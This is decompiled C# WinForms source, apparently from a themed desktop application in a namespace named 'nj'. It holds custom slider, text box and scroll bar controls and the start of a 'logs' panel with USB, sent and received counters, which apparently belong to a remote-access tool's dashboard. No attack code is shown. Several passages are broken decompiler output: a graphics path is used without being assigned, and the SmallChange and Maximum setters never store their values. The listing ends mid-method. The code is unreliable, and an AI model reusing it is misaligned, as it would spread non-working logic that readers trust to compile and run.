			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.AntiAlias;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			checked
			{
				this.Bar = new Rectangle(13, 11, this.Width - 27, this.Height - 21);
				graphics2.Clear(this.BackColor);
				graphics2.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
				Graphics arg_99_0 = graphics2;
				Brush arg_99_1 = new SolidBrush(this._StripColour);
				Rectangle rectangle = new Rectangle(3, (int)Math.Round(unchecked((double)this.Height / 2.0 - 4.0)), this.Width - 5, 8);
				arg_99_0.FillRectangle(arg_99_1, rectangle);
				Graphics arg_E4_0 = graphics2;
				Pen arg_E4_1 = new Pen(this._BorderColour, 2f);
				rectangle = new Rectangle(4, (int)Math.Round(unchecked((double)this.Height / 2.0 - 4.0)), this.Width - 5, 8);
				arg_E4_0.DrawRectangle(arg_E4_1, rectangle);
				Graphics arg_161_0 = graphics2;
				Brush arg_161_1 = new SolidBrush(this._StripAmountColour);
				rectangle = new Rectangle(4, (int)Math.Round(unchecked((double)this.Height / 2.0 - 4.0)), (int)Math.Round(unchecked((double)this.Bar.Width * ((double)this.Value / (double)this.Maximum))) + (int)Math.Round((double)this.Track.Width / 2.0), 8);
				arg_161_0.FillRectangle(arg_161_1, rectangle);
				graphics2.FillRectangle(new SolidBrush(this._BarBaseColour), this.Bar.X + (int)Math.Round(unchecked((double)this.Bar.Width * ((double)this.Value / (double)this.Maximum))) - (int)Math.Round((double)this.Track.Width / 2.0), this.Bar.Y + (int)Math.Round((double)this.Bar.Height / 2.0) - (int)Math.Round((double)this.Track.Height / 2.0), this.Track.Width, this.Track.Height);
				graphics2.DrawRectangle(new Pen(this._BorderColour, 2f), this.Bar.X + (int)Math.Round(unchecked((double)this.Bar.Width * ((double)this.Value / (double)this.Maximum))) - (int)Math.Round((double)this.Track.Width / 2.0), this.Bar.Y + (int)Math.Round((double)this.Bar.Height / 2.0) - (int)Math.Round((double)this.Track.Height / 2.0), this.Track.Width, this.Track.Height);
				Graphics arg_3D0_0 = graphics2;
				string arg_3D0_1 = Conversions.ToString(this._Value);
				Font arg_3D0_2 = new Font("Segoe UI", 6.5f, FontStyle.Regular);
				Brush arg_3D0_3 = new SolidBrush(this._TextColour);
				rectangle = new Rectangle(this.Bar.X + (int)Math.Round(unchecked((double)this.Bar.Width * ((double)this.Value / (double)this.Maximum))) - (int)Math.Round((double)this.Track.Width / 2.0), this.Bar.Y + (int)Math.Round((double)this.Bar.Height / 2.0) - (int)Math.Round((double)this.Track.Height / 2.0), this.Track.Width - 1, this.Track.Height);
				arg_3D0_0.DrawString(arg_3D0_1, arg_3D0_2, arg_3D0_3, rectangle, new StringFormat
				{
					Alignment = StringAlignment.Center,
					LineAlignment = StringAlignment.Center
				});
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("TextChanged")]
	public class LogInUserTextBox : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		[AccessedThroughProperty("TB")]
		private TextBox _TB;

		private Color _BaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private HorizontalAlignment _TextAlign;

		private int _MaxLength;

		private bool _ReadOnly;

		private bool _UseSystemPasswordChar;

		private bool _Multiline;

		private virtual TextBox TB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TB = value;
			}
		}

		[Category("Options")]
		public HorizontalAlignment TextAlign
		{
			get
			{
				return this._TextAlign;
			}
			set
			{
				this._TextAlign = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.TextAlign = value;
				}
			}
		}

		[Category("Options")]
		public int MaxLength
		{
			get
			{
				return this._MaxLength;
			}
			set
			{
				this._MaxLength = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.MaxLength = value;
				}
			}
		}

		[Category("Options")]
		public bool ReadOnly
		{
			get
			{
				return this._ReadOnly;
			}
			set
			{
				this._ReadOnly = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.ReadOnly = value;
				}
			}
		}

		[Category("Options")]
		public bool UseSystemPasswordChar
		{
			get
			{
				return this._UseSystemPasswordChar;
			}
			set
			{
				this._UseSystemPasswordChar = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.UseSystemPasswordChar = value;
				}
			}
		}

		[Category("Options")]
		public bool Multiline
		{
			get
			{
				return this._Multiline;
			}
			set
			{
				this._Multiline = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Multiline = value;
						if (value)
						{
							this.TB.Height = this.Height - 11;
						}
						else
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		[Category("Options")]
		public override string Text
		{
			get
			{
				return base.Text;
			}
			set
			{
				base.Text = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.Text = value;
				}
			}
		}

		[Category("Options")]
		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				base.Font = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Font = value;
						Control arg_37_0 = this.TB;
						Point location = new Point(3, 5);
						arg_37_0.Location = location;
						this.TB.Width = this.Width - 35;
						flag = !this._Multiline;
						if (flag)
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		[Category("Colours")]
		public Color BackgroundColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInUserTextBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInUserTextBox.__ENCList.Count == LogInUserTextBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInUserTextBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInUserTextBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInUserTextBox.__ENCList[num] = LogInUserTextBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInUserTextBox.__ENCList.RemoveRange(num, LogInUserTextBox.__ENCList.Count - num);
						LogInUserTextBox.__ENCList.Capacity = LogInUserTextBox.__ENCList.Count;
					}
					LogInUserTextBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.TB);
			if (flag)
			{
				this.Controls.Add(this.TB);
			}
		}

		private void OnBaseTextChanged(object s, EventArgs e)
		{
			this.Text = this.TB.Text;
		}

		private void OnBaseKeyDown(object s, KeyEventArgs e)
		{
			bool flag = e.Control && e.KeyCode == Keys.A;
			if (flag)
			{
				this.TB.SelectAll();
				e.SuppressKeyPress = true;
			}
			flag = (e.Control && e.KeyCode == Keys.C);
			if (flag)
			{
				this.TB.Copy();
				e.SuppressKeyPress = true;
			}
		}

		protected override void OnResize(EventArgs e)
		{
			Control arg_12_0 = this.TB;
			Point location = new Point(5, 5);
			arg_12_0.Location = location;
			checked
			{
				this.TB.Width = this.Width - 35;
				bool multiline = this._Multiline;
				if (multiline)
				{
					this.TB.Height = this.Height - 11;
				}
				else
				{
					this.Height = this.TB.Height + 11;
				}
				base.OnResize(e);
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.TB.Focus();
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInUserTextBox()
		{
			LogInUserTextBox.__ENCAddToList(this);
			this.State = MouseState.None;
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TextAlign = HorizontalAlignment.Left;
			this._MaxLength = 32767;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			this.TB = new TextBox();
			this.TB.Height = 190;
			this.TB.Font = new Font("Segoe UI", 10f);
			this.TB.Text = this.Text;
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			this.TB.MaxLength = this._MaxLength;
			this.TB.Multiline = false;
			this.TB.ReadOnly = this._ReadOnly;
			this.TB.UseSystemPasswordChar = this._UseSystemPasswordChar;
			this.TB.BorderStyle = BorderStyle.None;
			Control arg_167_0 = this.TB;
			Point location = new Point(5, 5);
			arg_167_0.Location = location;
			this.TB.Width = checked(this.Width - 35);
			this.TB.TextChanged += new EventHandler(this.OnBaseTextChanged);
			this.TB.KeyDown += new KeyEventHandler(this.OnBaseKeyDown);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			GraphicsPath graphicsPath;
			graphics2.FillPath(new SolidBrush(Color.FromArgb(42, 42, 42)), graphicsPath);
			graphics2.DrawPath(new Pen(new SolidBrush(Color.FromArgb(35, 35, 35)), 2f), graphicsPath);
			graphicsPath.Dispose();
			Graphics arg_106_0 = graphics2;
			Brush arg_106_1 = new SolidBrush(this.FindForm().BackColor);
			checked
			{
				Rectangle rect = new Rectangle(this.Width - 25, this.Height - 23, this.Height + 25, this.Height + 25);
				arg_106_0.FillPie(arg_106_1, rect, 180f, 90f);
				Graphics arg_15A_0 = graphics2;
				Pen arg_15A_1 = new Pen(Color.FromArgb(35, 35, 35), 2f);
				rect = new Rectangle(this.Width - 25, this.Height - 23, this.Height + 25, this.Height + 25);
				arg_15A_0.DrawPie(arg_15A_1, rect, 180f, 90f);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("Scroll")]
	public class LogInVerticalScrollBar : Control
	{
		public delegate void ScrollEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private int ThumbMovement;

		private Rectangle TSA;

		private Rectangle BSA;

		private Rectangle Shaft;

		private Rectangle Thumb;

		private bool ShowThumb;

		private bool ThumbPressed;

		private int _ThumbSize;

		public int _Minimum;

		public int _Maximum;

		public int _Value;

		public int _SmallChange;

		private int _ButtonSize;

		public int _LargeChange;

		private Color _ThumbBorder;

		private Color _LineColour;

		private Color _ArrowColour;

		private Color _BaseColour;

		private Color _ThumbColour;

		private Color _ThumbSecondBorder;

		private Color _FirstBorder;

		private Color _SecondBorder;

		private LogInVerticalScrollBar.ScrollEventHandler ScrollEvent;

		public event LogInVerticalScrollBar.ScrollEventHandler Scroll
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ScrollEvent = (LogInVerticalScrollBar.ScrollEventHandler)Delegate.Combine(this.ScrollEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ScrollEvent = (LogInVerticalScrollBar.ScrollEventHandler)Delegate.Remove(this.ScrollEvent, value);
			}
		}

		[Category("Colours")]
		public Color ThumbBorder
		{
			get
			{
				return this._ThumbBorder;
			}
			set
			{
				this._ThumbBorder = value;
			}
		}

		[Category("Colours")]
		public Color LineColour
		{
			get
			{
				return this._LineColour;
			}
			set
			{
				this._LineColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowColour
		{
			get
			{
				return this._ArrowColour;
			}
			set
			{
				this._ArrowColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbColour
		{
			get
			{
				return this._ThumbColour;
			}
			set
			{
				this._ThumbColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbSecondBorder
		{
			get
			{
				return this._ThumbSecondBorder;
			}
			set
			{
				this._ThumbSecondBorder = value;
			}
		}

		[Category("Colours")]
		public Color FirstBorder
		{
			get
			{
				return this._FirstBorder;
			}
			set
			{
				this._FirstBorder = value;
			}
		}

		[Category("Colours")]
		public Color SecondBorder
		{
			get
			{
				return this._SecondBorder;
			}
			set
			{
				this._SecondBorder = value;
			}
		}

		public int Minimum
		{
			get
			{
				return this._Minimum;
			}
			set
			{
				this._Minimum = value;
				bool flag = value > this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value > this._Maximum);
				if (flag)
				{
					this._Maximum = value;
				}
				this.InvalidateLayout();
			}
		}

		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value < this._Minimum);
				if (flag)
				{
					this._Minimum = value;
				}
			}
		}

		public int Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value == this._Value;
				if (!flag)
				{
					flag = (value < this._Minimum);
					if (flag)
					{
						this._Value = this._Minimum;
					}
					else
					{
						flag = (value > this._Maximum);
						if (flag)
						{
							this._Value = this._Maximum;
						}
						else
						{
							this._Value = value;
						}
					}
					this.InvalidatePosition();
					LogInVerticalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
					flag = (scrollEvent != null);
					if (flag)
					{
						scrollEvent(this);
					}
				}
			}
		}

		public int SmallChange
		{
			get
			{
				return this._SmallChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					flag = (value > ((-(((this._SmallChange == value) > false) ? 1 : 0)) ? 1 : 0));
					if (flag)
					{
					}
				}
			}
		}

		public int LargeChange
		{
			get
			{
				return this._LargeChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					this._LargeChange = value;
				}
			}
		}

		public int ButtonSize
		{
			get
			{
				return this._ButtonSize;
			}
			set
			{
				bool flag = value < 16;
				if (flag)
				{
					this._ButtonSize = 16;
				}
				else
				{
					this._ButtonSize = value;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInVerticalScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInVerticalScrollBar.__ENCList.Count == LogInVerticalScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInVerticalScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInVerticalScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInVerticalScrollBar.__ENCList[num] = LogInVerticalScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInVerticalScrollBar.__ENCList.RemoveRange(num, LogInVerticalScrollBar.__ENCList.Count - num);
						LogInVerticalScrollBar.__ENCList.Capacity = LogInVerticalScrollBar.__ENCList.Count;
					}
					LogInVerticalScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this.InvalidateLayout();
		}

		private void InvalidateLayout()
		{
			this.TSA = new Rectangle(0, 1, this.Width, 0);
			checked
			{
				this.Shaft = new Rectangle(0, this.TSA.Bottom - 1, this.Width, this.Height - 3);
				this.ShowThumb = (this._Maximum - this._Minimum != 0);
				bool flag = this.ShowThumb;
				if (flag)
				{
					this.Thumb = new Rectangle(1, 0, this.Width - 3, this._ThumbSize);
				}
				LogInVerticalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
				flag = (scrollEvent != null);
				if (flag)
				{
					scrollEvent(this);
				}
				this.InvalidatePosition();
			}
		}

		private void InvalidatePosition()
		{
			this.Thumb.Y = checked((int)Math.Round(unchecked(checked((double)(this._Value - this._Minimum) / (double)(this._Maximum - this._Minimum)) * (double)(checked(this.Shaft.Height - this._ThumbSize)) + 1.0)));
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left && this.ShowThumb;
			checked
			{
				if (flag)
				{
					bool flag2 = this.TSA.Contains(e.Location);
					if (flag2)
					{
						this.ThumbMovement = this._Value - this._SmallChange;
					}
					else
					{
						flag2 = this.BSA.Contains(e.Location);
						if (flag2)
						{
							this.ThumbMovement = this._Value + this._SmallChange;
						}
						else
						{
							flag2 = this.Thumb.Contains(e.Location);
							if (flag2)
							{
								this.ThumbPressed = true;
								return;
							}
							flag2 = (e.Y < this.Thumb.Y);
							if (flag2)
							{
								this.ThumbMovement = this._Value - this._LargeChange;
							}
							else
							{
								this.ThumbMovement = this._Value + this._LargeChange;
							}
						}
					}
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			bool flag = this.ThumbPressed && this.ShowThumb;
			checked
			{
				if (flag)
				{
					int num = e.Y - this.TSA.Height - this._ThumbSize / 2;
					int num2 = this.Shaft.Height - this._ThumbSize;
					this.ThumbMovement = (int)Math.Round(unchecked((double)num / (double)num2 * (double)(checked(this._Maximum - this._Minimum)))) + this._Minimum;
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			this.ThumbPressed = false;
		}

		public LogInVerticalScrollBar()
		{
			LogInVerticalScrollBar.__ENCAddToList(this);
			this._ThumbSize = 24;
			this._Minimum = 0;
			this._Maximum = 100;
			this._Value = 0;
			this._SmallChange = 1;
			this._ButtonSize = 16;
			this._LargeChange = 10;
			this._ThumbBorder = Color.FromArgb(35, 35, 35);
			this._LineColour = Color.FromArgb(23, 119, 151);
			this._ArrowColour = Color.FromArgb(37, 37, 37);
			this._BaseColour = Color.FromArgb(47, 47, 47);
			this._ThumbColour = Color.FromArgb(55, 55, 55);
			this._ThumbSecondBorder = Color.FromArgb(65, 65, 65);
			this._FirstBorder = Color.FromArgb(55, 55, 55);
			this._SecondBorder = Color.FromArgb(35, 35, 35);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(24, 50);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			Point[] array = new Point[10];
			Point[] arg_61_0_cp_0 = array;
			int arg_61_0_cp_1 = 0;
			checked
			{
				Point point = new Point((int)Math.Round((double)this.Width / 2.0), 5);
				arg_61_0_cp_0[arg_61_0_cp_1] = point;
				Point[] arg_91_0_cp_0 = array;
				int arg_91_0_cp_1 = 1;
				Point point2 = new Point((int)Math.Round((double)this.Width / 4.0), 13);
				arg_91_0_cp_0[arg_91_0_cp_1] = point2;
				Point[] arg_CB_0_cp_0 = array;
				int arg_CB_0_cp_1 = 2;
				Point point3 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 - 2.0)), 13);
				arg_CB_0_cp_0[arg_CB_0_cp_1] = point3;
				Point[] arg_10C_0_cp_0 = array;
				int arg_10C_0_cp_1 = 3;
				Point point4 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 - 2.0)), this.Height - 13);
				arg_10C_0_cp_0[arg_10C_0_cp_1] = point4;
				Point[] arg_143_0_cp_0 = array;
				int arg_143_0_cp_1 = 4;
				Point point5 = new Point((int)Math.Round((double)this.Width / 4.0), this.Height - 13);
				arg_143_0_cp_0[arg_143_0_cp_1] = point5;
				Point[] arg_179_0_cp_0 = array;
				int arg_179_0_cp_1 = 5;
				Point point6 = new Point((int)Math.Round((double)this.Width / 2.0), this.Height - 5);
				arg_179_0_cp_0[arg_179_0_cp_1] = point6;
				Point[] arg_1C2_0_cp_0 = array;
				int arg_1C2_0_cp_1 = 6;
				Point point7 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 4.0 - 1.0)), this.Height - 13);
				arg_1C2_0_cp_0[arg_1C2_0_cp_1] = point7;
				Point[] arg_203_0_cp_0 = array;
				int arg_203_0_cp_1 = 7;
				Point point8 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 + 2.0)), this.Height - 13);
				arg_203_0_cp_0[arg_203_0_cp_1] = point8;
				Point[] arg_23D_0_cp_0 = array;
				int arg_23D_0_cp_1 = 8;
				Point point9 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 + 2.0)), 13);
				arg_23D_0_cp_0[arg_23D_0_cp_1] = point9;
				Point[] arg_280_0_cp_0 = array;
				int arg_280_0_cp_1 = 9;
				Point point10 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 4.0 - 1.0)), 13);
				arg_280_0_cp_0[arg_280_0_cp_1] = point10;
				Point[] points = array;
				graphics2.FillPolygon(new SolidBrush(this._ArrowColour), points);
				graphics2.FillRectangle(new SolidBrush(this._ThumbColour), this.Thumb);
				graphics2.DrawRectangle(new Pen(this._ThumbBorder), this.Thumb);
				graphics2.DrawRectangle(new Pen(this._ThumbSecondBorder), this.Thumb.X + 1, this.Thumb.Y + 1, this.Thumb.Width - 2, this.Thumb.Height - 2);
				Graphics arg_39C_0 = graphics2;
				Pen arg_39C_1 = new Pen(this._LineColour, 2f);
				point10 = new Point((int)Math.Round(unchecked((double)this.Thumb.Width / 2.0 + 1.0)), this.Thumb.Y + 4);
				Point arg_39C_2 = point10;
				point9 = new Point((int)Math.Round(unchecked((double)this.Thumb.Width / 2.0 + 1.0)), this.Thumb.Bottom - 4);
				arg_39C_0.DrawLine(arg_39C_1, arg_39C_2, point9);
				graphics2.DrawRectangle(new Pen(this._FirstBorder), 0, 0, this.Width - 1, this.Height - 1);
				graphics2.DrawRectangle(new Pen(this._SecondBorder), 1, 1, this.Width - 3, this.Height - 3);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class logs : UserControl
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("USB")]
		private Label _USB;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("cn")]
		private Label _cn;

		[AccessedThroughProperty("snt")]
		private Label _snt;

		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		[AccessedThroughProperty("rc")]
		private Label _rc;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("lgs")]
		private RichTextBox _lgs;

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label4_Click);
				bool flag = this._Label4 != null;
				if (flag)
				{
					this._Label4.Click -= value2;
				}
				this._Label4 = value;
				flag = (this._Label4 != null);
				if (flag)
				{
					this._Label4.Click += value2;
				}
			}
		}

		internal virtual Label USB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._USB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._USB = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Label cn
		{
			[DebuggerNonUserCode]
			get
			{
				return this._cn;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._cn = value;
			}
		}

		internal virtual Label snt
		{
			[DebuggerNonUserCode]
			get
			{
				return this._snt;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._snt = value;
			}
		}

		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label6_Click);
				bool flag = this._Label6 != null;
				if (flag)
				{
					this._Label6.Click -= value2;
				}
				this._Label6 = value;
				flag = (this._Label6 != null);
				if (flag)
				{
					this._Label6.Click += value2;
				}
			}
		}

		internal virtual Label rc
		{
			[DebuggerNonUserCode]
			get
			{
				return this._rc;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._rc = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				bool flag = this._Panel1 != null;
				if (flag)
				{
					this._Panel1.Paint -= value2;
				}
				this._Panel1 = value;
				flag = (this._Panel1 != null);
				if (flag)
				{
					this._Panel1.Paint += value2;
				}
			}
		}

		internal virtual RichTextBox lgs
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lgs;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Lgs_TextChanged);
				EventHandler value3 = new EventHandler(this.Lgs_Resize);
				bool flag = this._lgs != null;
				if (flag)
				{
					this._lgs.TextChanged -= value2;
					this._lgs.Resize -= value3;
				}
				this._lgs = value;
				flag = (this._lgs != null);
				if (flag)
				{
					this._lgs.TextChanged += value2;
					this._lgs.Resize += value3;
				}
			}
		}

		[DebuggerNonUserCode]
		public logs()
		{
			base.Load += new EventHandler(this.Logs_Load);
			logs.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = logs.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = logs.__ENCList.Count == logs.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = logs.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = logs.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									logs.__ENCList[num] = logs.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
